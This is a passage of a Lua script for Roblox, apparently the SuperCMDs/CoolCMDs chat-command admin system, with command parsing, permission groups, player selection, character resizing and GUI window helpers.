		if DebugEnabled == true then
		local Debug = Instance.new("IntValue")
		Debug.Name = "Debug"
		Debug.Parent = NewScript
	end
	NewScript.Parent = Parent
end

CoolCMDs.Functions.Explode = function(Divider, Text)
	if Text == "" or Text == nil or type(Text) ~= "string" then return {} end
	if Divider == "" or Divider == nil or type(Divider) ~= "string" then return {Text} end
	local Position, Words = 0, {}
	for Start, Stop in function() return string.find(Text, Divider, Position, true) end do
		table.insert(Words, string.sub(Text, Position, Start - 1))
		Position = Stop + 1
	end
	table.insert(Words, string.sub(Text, Position))
	return Words
end
CoolCMDs.Functions.GetRecursiveChildren = function(Source, Name, SearchType, Children)
	if Source == nil then
		Source = game
	end
	if Name == nil or type(Name) ~= "string" then
		Name = ""
	end
	if Children == nil or type(Children) ~= "table" then
		Children = {}
	end
	for _, Child in pairs(Source:children()) do
		pcall(function()
			if (function()
				if SearchType == nil or SearchType == 1 then
					return string.match(Child.Name:lower(), Name:lower())
				elseif SearchType == 2 then
					return string.match(Child.className:lower(), Name:lower())
				elseif SearchType == 3 then
					return Child:IsA(Name) or Child:IsA(Name:lower())
				elseif SearchType == 4 then
					return string.match(Child.Name:lower() .. string.rep(string.char(1), 5) .. Child.className:lower(), Name:lower()) or Child:IsA(Name) or Child:IsA(Name:lower())
				end
				return false
			end)() then
				table.insert(Children, Child)
			end
			CoolCMDs.Functions.GetRecursiveChildren(Child, Name, SearchType, Children)
		end)
	end
	return Children
end

CoolCMDs.Functions.CatchMessage = function(Message, Speaker)
	if Message == nil or Speaker == nil then return end
	CoolCMDs.Functions.PrintInLog("[CHAT] ["..Speaker.Name.."] "..Message)
	if string.sub(Message, 0, 4) == "/sc " then
		Message = string.sub(Message, 5)
	elseif string.sub(Message, 0, 5) == "lego" then
		Message = string.sub(Message, 6)
	elseif string.sub(Message, 0, 10) == "craft" then
		Message = string.sub(Message, 11)
	elseif string.sub(Message, 0, 10) == "scape" then
		Message = string.sub(Message, 11)
	end
	for i = 1, #CoolCMDs.CommandHandles do
		if (function()
			if type(CoolCMDs.CommandHandles[i].Command) == "string" then
				if CoolCMDs.Functions.Explode(CoolCMDs.Data.SplitCharacter, Message)[1]:lower() == CoolCMDs.CommandHandles[i].Command:lower() then
					return true
				end
			elseif type(CoolCMDs.CommandHandles[i].Command) == "table" then
				for x = 1, #CoolCMDs.CommandHandles[i].Command do
					if CoolCMDs.Functions.Explode(CoolCMDs.Data.SplitCharacter, Message)[1]:lower() == CoolCMDs.CommandHandles[i].Command[x]:lower() then
						return true
					end
				end
			end
			return false
		end)() == true then
			if CoolCMDs.Functions.GetPlayerTable(Speaker.Name) ~= nil then
				if CoolCMDs.Functions.GetGroup(CoolCMDs.Functions.GetPlayerTable(Speaker.Name).Group) ~= nil then
					if CoolCMDs.Functions.GetGroup(CoolCMDs.Functions.GetPlayerTable(Speaker.Name).Group).Control >= CoolCMDs.CommandHandles[i].Control then
						local Message2 = ""
						for x = 2, #CoolCMDs.Functions.Explode(CoolCMDs.Data.SplitCharacter, Message) - 1 do
							Message2 = Message2 .. CoolCMDs.Functions.Explode(CoolCMDs.Data.SplitCharacter, Message)[x] .. CoolCMDs.Data.SplitCharacter
						end
						for x = #CoolCMDs.Functions.Explode(CoolCMDs.Data.SplitCharacter, Message), #CoolCMDs.Functions.Explode(CoolCMDs.Data.SplitCharacter, Message) do
							Message2 = Message2 .. CoolCMDs.Functions.Explode(CoolCMDs.Data.SplitCharacter, Message)[x]
						end
						pcall(function() if Message2 == CoolCMDs.CommandHandles[i].Command:lower() then Message2 = "" end end)
						pcall(function() for x = 1, #CoolCMDs.CommandHandles[i].Command do if Message2:lower() == CoolCMDs.CommandHandles[i].Command[x]:lower() then Message2 = "" end end end)
						local Message3 = nil
						for x = 1, #CoolCMDs.Functions.Explode(CoolCMDs.Data.SplitCharacter, Message2) do
							if Message3 == nil then Message3 = {} end
							table.insert(Message3, CoolCMDs.Functions.Explode(CoolCMDs.Data.SplitCharacter, Message2)[x])
						end
						if Message3 == nil then Message3 = {""} end
						CoolCMDs.CommandHandles[i].Trigger(Message2, Message3, Speaker, CoolCMDs.CommandHandles[i])
					else
						CoolCMDs.Functions.CreateMessage("Message", "You are not an administrator.", 2.5, Speaker)
						wait(2.5)
						CoolCMDs.Functions.CreateMessage("Message", "Current Level:" ..CoolCMDs.Functions.GetGroup(CoolCMDs.Functions.GetPlayerTable(Speaker.Name).Group).Control.. ". Required Level: " ..CoolCMDs.CommandHandles[i].Control.. ".", 2.5, Speaker)
					end
				else
					CoolCMDs.Functions.GetPlayerTable(Speaker).Group = (function()
						local Max = math.huge
						for i = 1, #CoolCMDs.GroupHandles do
							if CoolCMDs.GroupHandles[i].Control < Max then
								Max = CoolCMDs.GroupHandles[i].Control
							end
						end
						return CoolCMDs.Functions.GetGroup(Max, "ByControl")
					end)()
					CoolCMDs.Functions.CreateMessage("Message", "An error has occurred.", 2.5, Speaker)
					wait(2.5)
					CoolCMDs.Functions.CreateMessage("Message", "You are not in a group.", 2.5, Speaker)
					wait(2.5)
					CoolCMDs.Functions.CreateMessage("Message", "You have been assigned to the group: \"" ..CoolCMDs.Functions.GetPlayerTable(Speaker).Group.. "\".", 2.5, Speaker)
				end
			end
		end
	end
end

CoolCMDs.Functions.CheckTable = function(tabl,val)
	for _, v in pairs(tabl) do
		if val == v then
			return true
		end
	end
	return false
end

CoolCMDs.Functions.GetPlayersFromCommand = function(plr, str) 
	local plrz = {} 
	str = str:lower()
	if str == "all" then plrz = game.Players:children()
	elseif str == "others" then for i, v in pairs(game.Players:children()) do if v ~= plr then table.insert(plrz, v) end end
	else
		local sn = {1} local en = {}
		for i = 1, #str do if str:sub(i,i) == "," then table.insert(sn, i+1) table.insert(en,i-1) end end
			for x = 1, #sn do 
				if (sn[x] and en[x] and str:sub(sn[x],en[x]) == "me") or (sn[x] and str:sub(sn[x]) == "me") then table.insert(plrz, plr)
				elseif (sn[x] and en[x] and str:sub(sn[x],en[x]) == "random") or (sn[x] and str:sub(sn[x]) == "random") then table.insert(plrz, game.Players:children()[math.random(#game.Players:children())])
				elseif (sn[x] and en[x] and str:sub(sn[x],en[x]) == "admins") or (sn[x] and str:sub(sn[x]) == "admins") then if ChkAdmin(plr.Name, true) then for i, v in pairs(game.Players:children()) do if ChkAdmin(v.Name, false) then table.insert(plrz, v) end end end
				elseif (sn[x] and en[x] and str:sub(sn[x],en[x]) == "nonadmins") or (sn[x] and str:sub(sn[x]) == "nonadmins") then for i, v in pairs(game.Players:children()) do if not ChkAdmin(v.Name, false) then table.insert(plrz, v) end end
				elseif (sn[x] and en[x] and str:sub(sn[x],en[x]):sub(1,4) == "team") then
					if game:findFirstChild("Teams") then for a, v in pairs(game.Teams:children()) do if v:IsA("Team") and str:sub(sn[x],en[x]):sub(6) ~= "" and v.Name:lower():find(str:sub(sn[x],en[x]):sub(6)) == 1 then 
					for q, p in pairs(game.Players:children()) do if p.TeamColor == v.TeamColor then table.insert(plrz, p) end end break
					end end end
					elseif (sn[x] and str:sub(sn[x]):sub(1,4):lower() == "team") then
					if game:findFirstChild("Teams") then for a, v in pairs(game.Teams:children()) do if v:IsA("Team") and str:sub(sn[x],en[x]):sub(6) ~= "" and v.Name:lower():find(str:sub(sn[x]):sub(6)) == 1 then 
					for q, p in pairs(game.Players:children()) do if p.TeamColor == v.TeamColor then table.insert(plrz, p) end end break
					end end end
					else
					for a, plyr in pairs(game.Players:children()) do 
					if (sn[x] and en[x] and str:sub(sn[x],en[x]) ~= "" and plyr.Name:lower():find(str:sub(sn[x],en[x])) == 1) or (sn[x] and str:sub(sn[x]) ~= "" and plyr.Name:lower():find(str:sub(sn[x])) == 1) or (str ~= "" and plyr.Name:lower():find(str) == 1) then 
					table.insert(plrz, plyr) break
					end
				end 
			end
		end
	end
	return plrz
end

CoolCMDs.Functions.RunAtBottomOfScript = function()
	CoolCMDs.Functions.PrintInLog("SuperCMDs has been made by uyjulian!")
	function onEntered(Player)
		local kv = Instance.new("ObjectValue")
		kv.Name = "kv"
		kv.Parent = Player
		if CoolCMDs.Functions.CheckTable(Admins,Player.Name) then 
			CoolCMDs.Functions.CreatePlayerTable(Player,CoolCMDs.Functions.GetGroup("Admin", "ByName")) 
		elseif Player.userId == game.CreatorId or CoolCMDs.Functions.CheckTable(Owners,Player.Name) then
			CoolCMDs.Functions.CreatePlayerTable(Player,CoolCMDs.Functions.GetGroup("Owner", "ByName")) 
		else 
			CoolCMDs.Functions.CreatePlayerTable(Player) 
		end 
	end

	function onLeft(Player)
		CoolCMDs.Functions.RemovePlayerTable(Player)
	end

	game:GetService("Players").PlayerAdded:connect(onEntered)
	game:GetService("Players").PlayerRemoving:connect(onLeft)
	for _, Player in pairs(game:service("Players"):GetPlayers()) do pcall(function() onEntered(Player) end) end
	CoolCMDs.Functions.LoadModule(true, nil, true)
	CoolCMDs.Initialization.FinishTime = game:service("Workspace").DistributedGameTime
	CoolCMDs.Initialization.ElapsedTime = CoolCMDs.Initialization.FinishTime - CoolCMDs.Initialization.StartTime
	wait()	
	CoolCMDs.Functions.PrintInLog("Time needed to load SuperCMDs: " .. CoolCMDs.Initialization.ElapsedTime)
	CoolCMDs.Functions.PrintInLog("Number of commands: " .. #CoolCMDs.CommandHandles)
	CoolCMDs.Functions.CreateMessage("Message", "Look for SuperCMDs in noobv14's models!", 5)
end

CoolCMDs.Functions.DoesGroupNameMatch = function(player, groupz)

end

--------------------------------------------------------------------------------------------------------------------------------------------------------
-- DO NOT TOUCH THE ABOVE! -----------------------------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------------------------------------------------------


------------------------------------Groups-----------------------------------
CoolCMDs.Functions.CreateGroup("Normal", 1, "Normal", "")
CoolCMDs.Functions.CreateGroup("Unused1", 2, "Unused1", "")
CoolCMDs.Functions.CreateGroup("Unused2", 3, "Unused2", "")
CoolCMDs.Functions.CreateGroup("TempAdmin", 4, "TempAdmin", "")
CoolCMDs.Functions.CreateGroup("Admin", 5, "Admin", "")
CoolCMDs.Functions.CreateGroup("Owner", 6, "Owner", "")
-----------------------------------------------------------------------------

--[[
CoolCMDs.Functions.CreateModule("[ Module Name Here ]", function(Self, Message)
-- [ Loading Function Here ]
return true
end, 
function(Self, Message)
-- [ Unloading Function Here ]
return true
end, "None")

CoolCMDs.Functions.CreateCommand("[ Command Name Here ]", 5, function(msg, MessageSplit, Speaker, Self)
-- [ Function Here ]
end, "None", "None", "None")

CoolCMDs.Functions.CreateGroup("[ Group Name Here ]", 0 [ Rank Number ], "[ Group Name Here ]", "")
--]]

--------------------------------------------------------------------------------------------------------------------------------------------------------
-- ADD YOUR OWN FUNCTIONS/COMMANDS! --------------------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------------------------------------------------------

CoolCMDs.Functions.CreateModule("EasyAutoGroupManager", function(Self, Message)
	Self.Owners = Owners
	Self.Admins = Admins

	function Self.OnEntered(Player)
		for i = 1, #Self.Owners do
			if Self.Owners[i] == Player.Name then
				CoolCMDs.Functions.GetPlayerTable(Player.Name).Group = "Owner"
				break
			end
		end
		for i = 1, #Self.Admins do
			if Self.Admins[i] == Player.Name then
				CoolCMDs.Functions.GetPlayerTable(Player.Name).Group = "Admin"
				break
			end
		end
		CoolCMDs.Functions.GetPlayerTable(Player.Name).Group = "Normal"
	end

	game:GetService("Players").PlayerAdded:connect(Self.OnEntered)
	for _, Player in pairs(game:service("Players"):GetPlayers()) do pcall(function() onEntered(Player) end) end
	return true
end, 
function(Self, Message)

	return true
end, "None")

CoolCMDs.Functions.CreateModule("BCGamesExtra", function(Self, Message)
pcall(function()
Hung = {}

MaxPlayers = game.Players.MaxPlayers
Clo = nil

function admin(plr)
	return true
end

function check_award(ID,Creator,Cre_ID,Enter_ID)
	if Creator then
		a=game.Players:GetChildren()
		for i=1,#a do 
			if a[i].userId == Cre_ID then
				Is_Here = true
			end
		end
		if Is_Here then
			b=game.Players:GetChildren()
			for x=1,#b do
				game:GetService("BadgeService"):AwardBadge(b[x].userId,ID)
			end
		end
	end
end

function checkifadmin(player)
print("Error")
return 0
end

function findplr(plr,spe)
	return CoolCMDs.Functions.GetPlayersFromCommand(plr,spe)
end

function findval(plr)
	count = 0
	Play = nil
	for i=1,#Banned do
		if string.find(string.lower(Banned[i]),string.lower(plr)) == 1 then
			count = count+1
			Play = i
		end
	end
	if count == 1 then
		return Play
	elseif count == 0 then
		return 0
	end
end

function findval2(plr)
	count = 0
	for i=1,#Admins do
		if string.find(string.lower(Admins[i]),string.lower(plr.Name)) == 1 then
			count = count+1
			Play = i
		end
	end
	if count == 1 then
		return Play
	elseif count == 0 then
		return 0
	end
end

function findtool(plr)
	count = 0
	Play = {}
	if plr == "all" then
		for _,vv in pairs(tools:GetChildren()) do
			table.insert(Play,vv)
		end
		count = count +1
	elseif plr ~= "all" then
		for _,v in pairs(tools:GetChildren()) do
			if string.find(string.lower(v.Name),string.lower(plr)) == 1 then
				count = count +1
				table.insert(Play,v)
			end
		end
	end
	if count == 1 then
		return Play
	elseif count == 0 then
		return 0
	end
end

function findval3(statname,plr)
	count = 0
	for _,v in pairs(plr.leaderstats:GetChildren()) do
		if string.find(string.lower(v.Name),string.lower(statname)) == 1 then
			count = count +1
			Play = v
		end
	end
	if count == 1 then
		return Play
	elseif count == 0 then
		return 0
	end
end


function scriptz(source,p,par)
	return CoolCMDs.Functions.CreateScript(source,p,false)
end 

function mess(text,type)
CoolCMDs.Functions.CreateMessage(type,text,5,workspace)
end

end)
return true
end, 
function(Self, Message)
return true
end, "Provides set-up for BCGames functions.")


CoolCMDs.Functions.CreateModule("Person299Extra", function(Self, Message)

function text(object,message,duration,type)
CoolCMDs.Functions.CreateMessage(type,message,duration,object)
end

function makeMessage(text,speaker)

end

namelist = { }
variablelist = { }
flist = { }

tools = Instance.new("Model")
for i, v in pairs(game.Lighting:GetChildren()) do
if v:IsA("BackpackItem") then
v:clone().Parent = tools
end
end

function NOMINATE10(person)
return CoolCMDs.Functions.CheckTable(Owners,person.Name)
end

function findintable(name,tab)
return CoolCMDs.Functions.CheckTable(tab,name)
end

function findplayer(name,speaker)
	return CoolCMDs.Functions.GetPlayersFromCommand(name,speaker)
end 

function findteam(name,speak)
teams = {}
if name then
for i,v in pairs(game:GetService("Teams"):GetChildren()) do
if v.Name:sub(1,name:len()):lower() == name:lower() then
table.insert(teams,v)
end
end
if #teams == 0 then
return false
end
if teams > 1 then 
return false
end
return teams[1]
end end

function createscript(source,par)
	return CoolCMDs.Functions.CreateScript(source,p,false)
end

function localscript(source,par)
	return CoolCMDs.Functions.CreateLocalScript(source,p,false)
end


function text(message,duration,type,object)
	CoolCMDs.Functions.CreateMessage(type,message,duration,object)
end

function PERSON299(name)
	return CoolCMDs.Functions.CheckTable(Admins,name)
end

return true
end, 
function(Self, Message)
-- [ Stuff Here ]
return true
end, "Provides set-up for Person299 functions.")

CoolCMDs.Functions.CreateModule("DavbotExtra", function(Self, Message)
delay(0,function()
Name = script.Owner.Value
Chat = true
Workspace = Game:GetService("Workspace")
Players = Game:GetService("Players")
Lighting = Game:GetService("Lighting")
ScriptContext = Game:GetService("ScriptContext")
ThemedBanner = script.ThemedBanner:clone()
Notification = script._Notification:clone()
motor = "Motor6D"
peritemtime = 1 
bantime = 10 
ver = 10.0

phrase = {"dog", "sasquatch", "alligator", "nuke", "nanometer", "tuberculosis", "galloshes", "Gazebo", "Supercalifragilisticexpealidocious", "noun", "verb", "adjective", "evapotranspiration", "percolation", "credidential", "improvisation", "Pneumonoultramicroscopicsilicovolcanoconiosis", "sponser", "advertisement", "Y0U'R34 NUBC41K!!1", "pie", "random", "math", "social" , "No u!", "penguin", "cheezeburgerz", "Pseudopseudohypoparathyroidism", "Hippopotomonstrosesquipedalian", "Floccinaucinihilipilification", "~The longest word in the english dictionary could not be posted here, since it has 189,819 letters~"}
MountainColors = {"Reddish brown", "Bright green", "Brown", "Earth green"}
--[[
if Workspace:FindFirstChild("Prison") == nil then
Prison = Game:service("InsertService"):LoadAsset(59770977)["Prison"]
Prison.Parent = Workspace
Prison:MakeJoints()
Prison:MoveTo(Vector3.new(0, 500, 2000))
end
--]]
function model(modelid, par)   
g = game:GetService("InsertService"):LoadAsset(modelid)
g.Parent = par
g:MakeJoints()
end

function Notify(Text)
G = Notification:Clone()
for i, v in pairs(Players:GetChildren()) do
if (v:FindFirstChild("PlayerGui") ~= nil) then
G1 = G:Clone()
G1.Message.Value = Text
G1.Parent = v.PlayerGui
end
end
end

function getAll(...)
local args = {...}
local recursor
local IsAs = {}
local parent = game
for i = 1, #args do
if type(args[i]) == "bool" or type(args[i]) == "nil" then
recursor = args[i]
elseif type(args[i]) == "string" then
table.insert(IsAs,args[i])
elseif type(args[i]) == "userdata" then
parent = args[i]
end
end
local t = {}
local ch = parent:GetChildren()
for i = 1, #ch do
if #IsAs > 0 then
for i2 = 1, #IsAs do
if ch[i]:IsA(IsAs[i2]) then
table.insert(t,ch[i])
break
end
end
else
table.insert(t,ch[i])
end
if not recursor then
local c = getAll(ch[i],unpack(IsAs))
for i = 1, #c do
table.insert(t,c[i])
end
end
end
return t
end

function size(char,scale)
local tor = char:FindFirstChild("Torso")
local ra = char:FindFirstChild("Right Arm")
local la = char:FindFirstChild("Left Arm")
local rl = char:FindFirstChild("Right Leg")
local ll = char:FindFirstChild("Left Leg")
local h = char:FindFirstChild("Head")
if ra then
ra.formFactor = 3
ra.Size = Vector3.new(1*scale,2*scale,1*scale)
end
if la then
la.formFactor = 3
la.Size = Vector3.new(1*scale,2*scale,1*scale)
end
if rl then
rl.formFactor = 3
rl.Size = Vector3.new(1*scale,2*scale,1*scale)
end
if ll then
ll.formFactor = 3
ll.Size = Vector3.new(1*scale,2*scale,1*scale)
end
if tor then
tor.formFactor = 3
tor.Size = Vector3.new(2*scale,2*scale,1*scale)
end
if h then
h.formFactor = 3
h.Size = Vector3.new(2*scale,1*scale,1*scale)
end
local rs = Instance.new(motor)
rs.Name = "Right Shoulder"
rs.MaxVelocity = 0.1
rs.Part0 = tor
rs.Part1 = ra
rs.C0 = CFrame.new(1*scale, 0.5*scale, 0, 0, 0, 1, 0, 1, 0, -1, -0, -0)
rs.C1 = CFrame.new(-0.5*scale, 0.5*scale, 0, 0, 0, 1, 0, 1, 0, -1, -0, -0)
rs.Parent = tor
local ls = Instance.new(motor)
ls.Name = "Left Shoulder"
ls.MaxVelocity = 0.1
ls.Part0 = tor
ls.Part1 = la
ls.C0 = CFrame.new(-1*scale, 0.5*scale, 0, -0, -0, -1, 0, 1, 0, 1, 0, 0)
ls.C1 = CFrame.new(0.5*scale, 0.5*scale, 0, -0, -0, -1, 0, 1, 0, 1, 0, 0)
ls.Parent = tor
local rh = Instance.new(motor)
rh.Name = "Right Hip"
rh.MaxVelocity = 0.1
rh.Part0 = tor
rh.Part1 = rl
rh.C0 = CFrame.new(1*scale, -1*scale, 0, 0, 0, 1, 0, 1, 0, -1, -0, -0)
rh.C1 = CFrame.new(0.5*scale, 1*scale, 0, 0, 0, 1, 0, 1, 0, -1, -0, -0)
rh.Parent = tor
local lh = Instance.new(motor)
lh.Name = "Left Hip"
lh.MaxVelocity = 0.1
lh.Part0 = tor
lh.Part1 = ll
lh.C0 = CFrame.new(-1*scale, -1*scale, 0, -0, -0, -1, 0, 1, 0, 1, 0, 0)
lh.C1 = CFrame.new(-0.5*scale, 1*scale, 0, -0, -0, -1, 0, 1, 0, 1, 0, 0)
lh.Parent = tor
local n = Instance.new(motor)
n.Name = "Neck"
n.MaxVelocity = 0.1
n.Part0 = tor
n.Part1 = h
n.C0 = CFrame.new(0, 1*scale, 0, -1*scale, -0, -0, 0, 0, 1, 0, 1, 0)
n.C1 = CFrame.new(0, -0.5*scale, 0, -1*scale, -0, -0, 0, 0, 1, 0, 1, 0)
n.Parent = tor
for i,v in pairs(getAll(char,"ShirtGraphic","BodyForce")) do
v:remove()
end
Instance.new("BlockMesh",ra)
Instance.new("BlockMesh",la)
Instance.new("BlockMesh",rl)
Instance.new("BlockMesh",ll)
Instance.new("BlockMesh",tor)
for i,v in pairs(getAll(char,"SpecialMesh")) do
if v.Name == "BodyMesh" then
local old = v.Parent
v.Parent = nil
v.Scale = Vector3.new(1,1,1)*scale
v.Parent = old
end
end
for i,v in pairs(getAll(char,"CharacterMesh")) do
if v.Name:lower():find("left leg") then
local m = Instance.new("SpecialMesh",ll)
m.Name = "BodyMesh"
m.Scale = Vector3.new(scale,scale,scale)
m.MeshId = "http://www.roblox.com/asset/?id="..v.MeshId
m.TextureId = "http://www.roblox.com/asset/?id="..v.OverlayTextureId
end
if v.Name:lower():find("right leg") then
local m = Instance.new("SpecialMesh",rl)
m.Name = "BodyMesh"
m.Scale = Vector3.new(scale,scale,scale)
m.MeshId = "http://www.roblox.com/asset/?id="..v.MeshId
m.TextureId = "http://www.roblox.com/asset/?id="..v.OverlayTextureId
end
if v.Name:lower():find("left arm") then
local m = Instance.new("SpecialMesh",la)
m.Name = "BodyMesh"
m.Scale = Vector3.new(scale,scale,scale)
m.MeshId = "http://www.roblox.com/asset/?id="..v.MeshId
m.TextureId = "http://www.roblox.com/asset/?id="..v.OverlayTextureId
end
if v.Name:lower():find("right arm") then
local m = Instance.new("SpecialMesh",ra)
m.Name = "BodyMesh"
m.Scale = Vector3.new(scale,scale,scale)
m.MeshId = "http://www.roblox.com/asset/?id="..v.MeshId
m.TextureId = "http://www.roblox.com/asset/?id="..v.OverlayTextureId
end
if v.Name:lower():find("torso") then
local m = Instance.new("SpecialMesh",tor)
m.Name = "BodyMesh"
m.Scale = Vector3.new(scale,scale,scale)
m.MeshId = "http://www.roblox.com/asset/?id="..v.MeshId
m.TextureId = "http://www.roblox.com/asset/?id="..v.OverlayTextureId
end
v:remove()
end
for i,v in pairs(getAll(char,"Hat")) do
local h = v:FindFirstChild("Handle")
if h then
local k = h:FindFirstChild("OriginSize")
if not k then
k = Instance.new("Vector3Value")
k.Name = "OriginSize"
k.Value = h.Size
k.Parent = h
end
local k2 = h:FindFirstChild("OriginScale")
if not k2 then
k2 = Instance.new("Vector3Value")
k2.Name = "OriginScale"
k2.Value = h.Mesh.Scale
k2.Parent = h
end
h.formFactor = 3
h.Size = k.Value*scale
h.Mesh.Scale = k2.Value*scale
end
local k = v:FindFirstChild("OriginPos")
if not k then
k = Instance.new("Vector3Value")
k.Name = "OriginPos"
k.Value = v.AttachmentPos
k.Parent = v
end
v.AttachmentPos = k.Value*scale+Vector3.new(0,(1-scale)/2,0)
v.Parent = nil
v.Parent = char
end
local hum = char:FindFirstChild("Humanoid")
if hum then
hum.WalkSpeed = 16*scale
end
local anim = char:FindFirstChild("Animate")
if anim then
local new = anim:clone()
anim:Remove()
new.Parent = char
end
end

function sound(id,par,ph,vo,tof,sou)  
sod = Instance.new("Sound")
sod.SoundId = "http://www.roblox.com/asset/?id=" .. id
sod.Parent = par
sod.Pitch = ph
sod.Volume = vo
sod.Looped = tof
sod.Name = sou
sod:Play()
end

function matchPlayer(str) 
local result = nil 
local players = Players:GetPlayers() 
for i,v in pairs(Players:GetPlayers()) do 
if (string.find(string.lower(v.Name), string.lower(str)) == 1) then 
if (result ~= nil) then return nil end 
result = v 
end 
end 
return result 
end

function matchService(str) 
local result = nil
for i, v in pairs(Game:GetChildren()) do 
if (string.find(string.lower(v.Name), str) == 1) then 
if (result ~= nil) then return nil end 
result = v 
end 
end 
return result 
end

function onEntered(Player)
delay(0,function()
for i, v in pairs(Players:GetChildren()) do
if v:FindFirstChild("PlayerGui") ~= nil then
c = ThemedBanner:Clone()
c.Parent = v.PlayerGui
end
end
if c.Message.Value == "" then
if Player.Name:lower() == Name:lower() then
for i, v in pairs(Players:GetChildren()) do
if v:FindFirstChild("PlayerGui") ~= nil then
c = v.PlayerGui.ThemedBanner
c.Message.Value = "Admin " ..Name.. " has entered the server."
end
end
else
for i, v in pairs(Players:GetChildren()) do
if v:FindFirstChild("PlayerGui") ~= nil then
c = v.PlayerGui.ThemedBanner
c.Message.Value = "Regular Person " ..Player.Name.. " has entered the server."
end
end
end
end
end)
end

Players.ChildAdded:connect(onEntered)
end)
return true
end, 
function(Self, Message)
return true
end, "Provices set-up for Davbot functions.")

----------------------------------
--- Defult CoolCMDs functions! ---
----------------------------------

CoolCMDs.Functions.CreateModule("GuiSupport", function(Self, Message)
function Self.WindowDisappear(Window, Factor)
for _, Children in pairs(Window:children()) do
pcall(function() Children.BackgroundTransparency = Factor end)
pcall(function() Children.TextTransparency = Factor end)
Self.WindowDisappear(Children, Factor)
end
end
function Self.WindowEffect(Window, Format, ...)
Args = {...}
if Window == nil then return false end
if Format == 1 or Format == "FadeIn" then
for i = 1, 0, Args[1] == nil and -0.075 or -math.abs(Args[1]) do
Window.Size = Window.Size - UDim2.new(0, 2, 0, 2)
Window.Position = Window.Position + UDim2.new(0, 1, 0, 1)
end
for i = 1, 0, Args[1] == nil and -0.075 or -math.abs(Args[1]) do
Window.Size = Window.Size + UDim2.new(0, 2, 0, 2)
Window.Position = Window.Position - UDim2.new(0, 1, 0, 1)
Self.WindowDisappear(Window, i)
wait()
end
Self.WindowDisappear(Window, 0)
elseif Format == 2 or Format == "FadeOut" then
if Args[2] == true then
local NewWindow = Window:Clone()
local function CleanGui(Child)
for _, Part in pairs(Child:children()) do
if not Part:IsA("GuiObject") then
pcall(function() Part.Disabled = true end)
Part:Remove()
else
pcall(function() Part.Active = false end)
pcall(function() Part.AutoButtonColor = false end)
CleanGui(Part)
end
end
end
CleanGui(NewWindow)
NewWindow.Parent = Window.Parent
Window:Remove()
Window = NewWindow
NewWindow = nil
end
for i = 0, 1, Args[1] == nil and 0.05 or math.abs(Args[1]) do
Window.Size = Window.Size + UDim2.new(0, 5, 0, 5)
Window.Position = Window.Position - UDim2.new(0, 5 / 2, 0, 5 / 2)
Self.WindowDisappear(Window, i)
wait()
end
for i = 0, 1, Args[1] == nil and 0.05 or math.abs(Args[1]) do
Window.Size = Window.Size - UDim2.new(0, 5, 0, 5)
Window.Position = Window.Position + UDim2.new(0, 5 / 2, 0, 5 / 2)
end
Self.WindowDisappear(Window, 1)
if Args[2] == true then
Window:Remove()
end
elseif Format == 3 or Format == "SimpleSlide" then
local OldPos = Window.Position
if Args[1] == nil then return false end
for i = 0, 1, Args[2] == nil and 0.05 or Args[2] do
Window.Position = UDim2.new(OldPos.X.Scale * (1 - i), OldPos.X.Offset * (1 - i), OldPos.Y.Scale * (1 - i), OldPos.Y.Offset * (1 - i)) + UDim2.new(Args[1].X.Scale * i, Args[1].X.Offset * i, Args[1].Y.Scale * i, Args[1].Y.Offset * i)
wait()
end
Window.Position = Args[1]
elseif Format == 4 or Format == "SmoothSlide" then
local OldPos = Window.Position
if Args[1] == nil then return false end
while true do
local XS = Args[1].X.Offset - OldPos.X.Scale
local XO = Args[1].X.Offset - OldPos.X.Offset
local YS = Args[1].Y.Offset - OldPos.Y.Scale
local YO = Args[1].Y.Offset - OldPos.Y.Offset
XO = (XO / (Args[2] == nil and 5 or Args[2]))
YO = (YO / (Args[2] == nil and 5 or Args[2]))
if math.abs(XO) < 0.5 and math.abs(YO) < 0.5 then break end
Window.Position = UDim2.new(OldPos.X.Scale, OldPos.X.Offset + XO, OldPos.Y.Scale, OldPos.Y.Offset + YO)
OldPos = UDim2.new(OldPos.X.Scale, OldPos.X.Offset + XO, OldPos.Y.Scale, OldPos.Y.Offset + YO)
wait()
end
Window.Position = Args[1]
end
return true
end
function Self.WindowCreate(WindowPosition, WindowSize, WindowParent, WindowName, WindowFadeIn, WindowFadeOut, WindowCanExit, WindowCanMinimize, WindowCanMaximize, WindowCanResize, WindowCanMove, WindowExitFunction, WindowMinimumSize)
if WindowPosition == nil then WindowPosition = UDim2.new(0, 0, 0, 0) end
if WindowSize == nil then WindowSize = UDim2.new(0, 300, 0, 175) end
if WindowCanClose == nil then WindowCanClose = true end
if WindowCanMinimize == nil then WindowCanMinimize = true end
if WindowCanMaximize == nil then WindowCanMaximize = true end
if WindowCanResize == nil then WindowCanResize = true end
if WindowCanMove == nil then WindowCanMove = true end
if WindowName == nil then WindowName = "Window" end
if WindowMinimumSize == nil then WindowMinimumSize = UDim2.new(0, 100, 0, 100) end
local WindowMoveXScale = 0
local WindowMoveYScale = 0
local WindowMoveXOffset = 0
local WindowMoveYOffset = 0
local WindowMoveXMouse = 0
local WindowMoveYMouse = 0
local WindowResizeXScale = 0
local WindowResizeYScale = 0
local WindowResizeXOffset = 0
local WindowResizeYOffset = 0
local WindowResizeXMouse = 0
local WindowResizeYMouse = 0
local WindowMove = false
local WindowIsMinimized = false
local WindowMinimizedPosition = nil
local WindowMinimizedSize = nil
local WindowUnminimizedText = nil
local WindowResize = false
local WindowMaximizedDelay = false
local WindowIsMaximized = false
local WindowUnmaximizedPosition = nil
local WindowUnmaximizedSize = nil
local Window = Instance.new("Frame")
Window.Name = WindowName
Window.Size = WindowSize
Window.Position = WindowPosition
Window.BorderSizePixel = 0
Window.BackgroundTransparency = 1
Window.Parent = WindowParent
local WindowTitleBar = Instance.new("TextButton")
WindowTitleBar.Name = "TitleBar"
WindowTitleBar.Size = UDim2.new(1, 0, 0, 25)
WindowTitleBar.BackgroundColor3 = Color3.new(0.1, 0.1, 0.9)
WindowTitleBar.BorderColor3 = Color3.new(0, 0, 0)
WindowTitleBar.AutoButtonColor = false
WindowTitleBar.Changed:connect(function(Property)
if Property == "Text" then
if string.sub(WindowTitleBar.Text, 0, 5) ~= string.rep(" ", 5) then
WindowTitleBar.Text = string.rep(" ", 5) ..WindowTitleBar.Text
end
end
end)
WindowTitleBar.Text = WindowName
WindowTitleBar.TextColor3 = Color3.new(1, 1, 1)
WindowTitleBar.TextWrap = true
